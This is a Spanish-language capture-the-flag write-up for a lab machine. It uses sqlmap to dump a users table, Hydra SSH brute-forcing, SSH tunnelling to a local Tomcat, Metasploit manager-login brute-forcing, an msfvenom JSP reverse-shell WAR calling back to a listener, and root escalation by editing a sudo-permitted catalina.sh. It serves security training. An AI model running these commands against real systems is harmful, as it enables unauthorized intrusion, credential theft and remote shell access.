## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Dentro hay un login que con una simple SQLi se puede bypassear pero no veremos mucho. Conociendo que es vulnerable decido ampliar el contenido con Sqlmap:

```bash
sqlmap -r request.txt --dbs
```

Encuentro la base de datos llamada crackofftrue_db:

```bash
sqlmap -r request.txt --batch -D crackofftrue_db --threads 10 --tables
```

Veo la tabla users y la dumpeo:

```bash
sqlmap -r request.txt --batch -D crackofftrue_db -T users --threads 10 --dump
```

Encuentro una lista de usuarios y contraseñas.

Creo un archivo para cada uno y realizo el ataque con Hydra:

users.txt

```bash
rejetto
alice
tomitoma
whoami
pip
rufus
jazmin
rosa
mario
veryhardpassword
root
admin
```

passwords.txt

```bash
password123
alicelaultramejor
passwordinhack
supersecurepasswordultra
estrella_big
colorcolorido
ultramegaverypasswordhack
unbreackroot
happypassword
admin12345password
carsisgood
badmenandwomen
```

```bash
hydra -L users.txt -P passwords.txt ssh://172.17.0.2 -t 64
```

User : rosa

Pass : ultramegaverypasswordhack

## Escalada rosa → tomcat

Encuentro un usuario llamado tomcat, como no hay uno en el análisis inicial, supongo que se ejecuta en local. Viendo los puertos que tiene abiertos:

```bash
netstat -punta
```

Encuentro tomcat.

Mediante una tunelización de puerto por SSH puedo acceder desde el navegador:

```bash
ssh rosa@172.17.0.2 -L 8080:127.0.0.1:8080
```

```bash
http://127.0.0.1:8080/
```

Dentro hay un panel de login:

```bash
http://127.0.0.1:8080/manager/
```

Para encontrar las credenciales uso Metasploit:

```bash
msfconsole

use auxiliary/scanner/http/tomcat_mgr_login
```

Lo configuro:

```bash
set RHOSTS 127.0.0.1
set USER_FILE PATH/users.txt
set PASS_FILE PATH/passwords.txt
set VERBOSE false
```

Encuentro:

```bash
tomitoma:supersecurepasswordultra
```

Una vez dentro me creo una revshell.war para subirla y recibir una conexión reversa. Para ello uso Msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o revshell.war
```

Me pongo en escucha y recibo conexión como usuario tomcat al ejecutarla.

## Escalada tomcat → root

```bash
sudo -l
(ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh
```

Veo que es un script con funciones de binario con permisos root y a parte permisos de edición.

Solo agrego /bin/bash en la segunda línea de código donde no tiene nada.

```bash
nano /opt/tomcat/bin/catalina.sh
sudo /opt/tomcat/bin/catalina.sh
```

Listo.
